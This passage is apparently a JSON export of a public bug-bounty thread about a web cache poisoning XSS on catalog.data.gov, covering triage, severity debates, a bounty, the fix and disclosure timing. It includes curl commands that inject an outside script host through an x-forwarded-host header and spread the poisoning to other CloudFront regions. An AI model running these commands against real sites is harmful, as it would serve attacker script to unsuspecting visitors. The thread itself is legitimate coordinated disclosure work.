$\u0026#39;Accept: /\u0026#39; -H $\u0026#39;Accept-Language: en\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\u0026#39; -H $\u0026#39;x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?\u0026#39; -H $\u0026#39;Connection: close\u0026#39; $url | fgrep portswigger \u0026amp;\u0026amp; echo -e \u0026quot;\\n\\n$url\u0026quot;\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe previous step should print out a URL like \u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database%3Fdontpoisoneveryone%3D1515773700\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on the last line. If you don\u0026#39;t see the URL, something went wrong. Load the URL that gets printed in Chrome\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWait a few seconds for the alert\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2018-01-12T16:15:54.979Z","updated_at":"2018-01-12T16:16:06.727Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for the additional information! We will investigate and get back to you as soon as we have an update to share.\n\nRegards.\n@joystick","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you for the additional information! We will investigate and get back to you as soon as we have an update to share.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003cbr\u003e\n\u003ca href=\"/joystick\"\u003e@joystick\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-13T17:22:06.498Z","updated_at":"2018-01-13T17:22:06.498Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282606,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!","markdown_message":"\u003cp\u003eWe were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-13T17:24:42.538Z","updated_at":"2018-01-13T17:24:42.538Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282610,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-13T17:29:43.572Z","updated_at":"2018-01-13T17:29:43.572Z","additional_data":{"old_severity":"Critical","new_severity":"Medium (5.8)","old_severity_id":106950,"new_severity_id":107751},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good to hear you've replicated it.\n\nJust in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).","markdown_message":"\u003cp\u003eGood to hear you\u0026#39;ve replicated it.\u003c/p\u003e\n\n\u003cp\u003eJust in case the logic behind the original critical severity isn\u0026#39;t clear, it\u0026#39;s that by tweaking the cURL command slightly it\u0026#39;s possible to poison \u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e so that random visitors will get exploited. This technique can be used on \u003cem\u003eevery\u003c/em\u003e dataset, and also possibly every other page on catalog.data.gov (I\u0026#39;m working on that).\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-13T17:38:25.364Z","updated_at":"2018-01-13T17:38:25.364Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282882,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-13T22:47:42.196Z","updated_at":"2018-01-13T22:47:42.196Z","additional_data":{"old_severity":"Medium (5.8)","new_severity":"High (7.4)","old_severity_id":107751,"new_severity_id":107790},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282886,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e - the complexity of the attack was set to \u003ccode\u003eHigh\u003c/code\u003e because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to \u003ccode\u003eLow\u003c/code\u003e since there isn\u0026#39;t much to any sensitive information to extract. Integrity was re-set to \u003ccode\u003eHigh\u003c/code\u003e given the fact that the injected JS might allow the attacker to override the page\u0026#39;s content. However, the attack would still require user interaction, and as a result the overall CVSS is \u003ccode\u003eHigh (7.4)\u003c/code\u003e. If you have any additional information that would help us better assess this report, please let us know.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-13T22:55:10.029Z","updated_at":"2018-01-13T22:55:10.029Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2285007,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @albinowax - \n\nThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\n\nThanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e - \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-15T09:48:26.470Z","updated_at":"2018-01-15T09:48:26.470Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2317508,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.\n\nAn attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov\u0026t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:\n\ncurl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234\n\nCheers.","markdown_message":"\u003cp\u003eThe statement that the complexity of this attack is \u0026#39;high\u0026#39; because Cloudfront would serve the cached response only to users from the same region as the attacker isn\u0026#39;t entirely accurate.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can easily poison the cache in arbitrary regions by using a service like \u003ccode\u003ehttps://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov\u0026amp;t=A\u003c/code\u003e to get a list of CloudFront\u0026#39;s frontends in different regions, then routing the attack through each of those in turn:\u003c/p\u003e\n\n\u003cp\u003ecurl --resolve catalog.data.gov:443:54.230.9.199 -H $\u0026#39;x-forwarded-host: portswigger-labs.net/\u0026#39; \u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database%3Fzxcv%3D1234\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-25T16:56:00.431Z","updated_at":"2018-01-25T16:56:00.431Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2338386,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-31T13:26:23.236Z","updated_at":"2018-01-31T13:26:23.236Z","additional_data":{"old_severity":"High (7.4)","new_severity":"High (8.6)","old_severity_id":107790,"new_severity_id":113917},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2338387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax - thank for the follow-up! we adjusted to the complexity to `High`.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e - thank for the follow-up! we adjusted to the complexity to \u003ccode\u003eHigh\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-31T13:27:07.551Z","updated_at":"2018-01-31T13:27:07.551Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2354064,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-06T01:06:07.838Z","updated_at":"2018-02-06T01:06:07.838Z","actor":{"url":"/tts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"TTS Bug Bounty"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"tts","collaborator":{"username":"albinowax","url":"/albinowax"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2817872,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.","markdown_message":"\u003cp\u003eIt looks like this vulnerability hasn\u0026#39;t been fixed since I reported it several months ago. I should mention that I\u0026#39;m planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month\u0026#39;s time. Unfortunately after this point it\u0026#39;s likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it\u0026#39;s worth resolving this issue promptly.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-30T14:03:37.507Z","updated_at":"2018-05-30T14:03:37.507Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2819559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e Thanks for the poke, and the heads up. We\u0026#39;ll investigate this internally and will update this thread.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-30T19:05:09.960Z","updated_at":"2018-05-30T19:05:09.960Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3025709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e We\u0026#39;ve tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we\u0026#39;d usually like. I don\u0026#39;t have a specific ETA right now, but we\u0026#39;re aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you\u0026#39;ve given, and for the notice you\u0026#39;ve provided of your intent to disclose it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-10T17:30:35.548Z","updated_at":"2018-07-10T17:30:35.548Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3093683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Just so you know, we're still tracking and aim to have this resolved soon.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e Just so you know, we\u0026#39;re still tracking and aim to have this resolved soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-24T20:24:28.998Z","updated_at":"2018-07-24T20:24:28.998Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3096853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update. Is it safe to assume this will be resolved by the 9th August? ","markdown_message":"\u003cp\u003eThanks for the update. Is it safe to assume this will be resolved by the 9th August? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-25T14:01:18.251Z","updated_at":"2018-07-25T14:01:18.251Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3097455,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Yes, that's our plan and we believe that's safe to assume.","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e Yes, that\u0026#39;s our plan and we believe that\u0026#39;s safe to assume.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-25T17:01:14.105Z","updated_at":"2018-07-25T17:01:14.105Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3161755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This has been resolved by the Data.gov team.","markdown_message":"\u003cp\u003eThis has been resolved by the Data.gov team.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-08T13:59:19.365Z","updated_at":"2018-08-08T13:59:19.365Z","actor":{"username":"hyonjkim","cleared":false,"url":"/hyonjkim","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3163519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599\n\nMy understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here \u003ca title=\"https://github.com/ckan/ckan/pull/2599\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fckan%2Fckan%2Fpull%2F2599\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/ckan/ckan/pull/2599\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eMy understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven\u0026#39;t seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here \u003ca title=\"https://github.com/rails/rails/issues/29893\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fissues%2F29893\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/issues/29893\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-08T22:42:56.979Z","updated_at":"2018-08-08T22:44:52.523Z","actor":{"username":"philipashlock","cleared":false,"url":"/philipashlock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3163556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue. ","markdown_message":"\u003cp\u003e\u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We\u0026#39;re aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it\u0026#39;s unlikely they\u0026#39;ll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-08T23:08:55.407Z","updated_at":"2018-08-08T23:08:55.407Z","actor":{"username":"philipashlock","cleared":false,"url":"/philipashlock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3169078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.","markdown_message":"\u003cp\u003eThanks for the additional info, it\u0026#39;s very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-09T21:53:04.904Z","updated_at":"2018-08-09T21:53:04.904Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3378835,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this issue could be marked as resolved now.","markdown_message":"\u003cp\u003eI think this issue could be marked as resolved now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-24T10:17:38.711Z","updated_at":"2018-09-24T10:17:38.711Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3511708,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello, \n\nThanks for submitting this report. We have determined that this report is now resolved. If you’re still able to reproduce  this issue, please let us know and we will investigate further. \n\nThanks! \n ","markdown_message":"\u003cp\u003eHello, \u003c/p\u003e\n\n\u003cp\u003eThanks for submitting this report. We have determined that this report is now resolved. If you’re still able to reproduce  this issue, please let us know and we will investigate further. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-22T02:19:36.426Z","updated_at":"2018-10-22T02:19:36.426Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3512567,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-22T08:25:26.849Z","updated_at":"2018-10-22T08:25:26.849Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3572402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-01T21:16:04.365Z","updated_at":"2018-11-01T21:16:04.365Z","actor":{"username":"jjediny","cleared":false,"url":"/jjediny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3572403,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-01T21:16:04.444Z","updated_at":"2018-11-01T21:16:04.444Z","actor":{"username":"jjediny","cleared":false,"url":"/jjediny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}